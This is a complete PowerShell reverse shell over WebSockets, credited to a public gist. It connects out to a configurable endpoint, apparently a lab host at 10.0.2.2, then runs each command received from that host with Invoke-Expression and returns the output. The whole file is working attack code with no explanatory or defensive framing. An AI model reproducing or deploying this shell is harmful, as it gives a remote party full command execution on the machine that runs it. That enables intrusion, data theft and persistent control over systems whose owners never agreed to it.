# Credits:
# https://gist.github.com/byt3bl33d3r/910b3161d54c2d6a3d5e1050c4e1013e

# Might wanna change this
$endpoint = "ws://10.0.2.2:42069"

$ws = New-Object Net.WebSockets.ClientWebSocket
$cancellationTokenSource = New-Object Threading.CancellationTokenSource
$buffer = [byte[]]::new(4096)

# Call home
$ws.ConnectAsync($endpoint, $cancellationTokenSource.Token).
    GetAwaiter().
    GetResult()

Write-Host -ForegroundColor Green "Connected"

$ascii = New-Object System.Text.ASCIIEncoding

function Get-Prompt {
    return $ascii.GetBytes('PS ' + (Get-Location).Path + '> ')
}

function await {
    param([Threading.Tasks.Task]$awaitable)
    return $awaitable.GetAwaiter().GetResult()
}

function Send-WebSocket {
    param([byte[]]$message, [bool]$end)
    await $ws.SendAsync($message, [System.Net.WebSockets.WebSocketMessageType]::Binary, $end, $cancellationTokenSource.Token) | Out-Null
}

[byte[]]$prompt = Get-Prompt
Send-WebSocket $prompt $true

try {
    while ($true) {
        $received = (await $ws.ReceiveAsync($buffer, $cancellationTokenSource.Token)).Count
    
        $query = $ascii.GetString($buffer, 0, $received)
        $buffer.Clear()
        try {
            $value = (Invoke-Expression -Command $query 2>&1 | Out-String)
        } catch {
            $value += ($error[0] | Out-String)
            $error.Clear()
        }

        [byte[]]$result = $ascii.GetBytes($value)
        Send-WebSocket $result $false

        [byte[]]$prompt = Get-Prompt
        Send-WebSocket $prompt $true
    }
} catch {
    await ($ws.CloseAsync(
        [System.Net.WebSockets.WebSocketCloseStatus]::Empty,
        "",
        $cancellationTokenSource.Token
    )) | Out-Null
}
Write-Host -ForegroundColor Red "Closing WebSocket"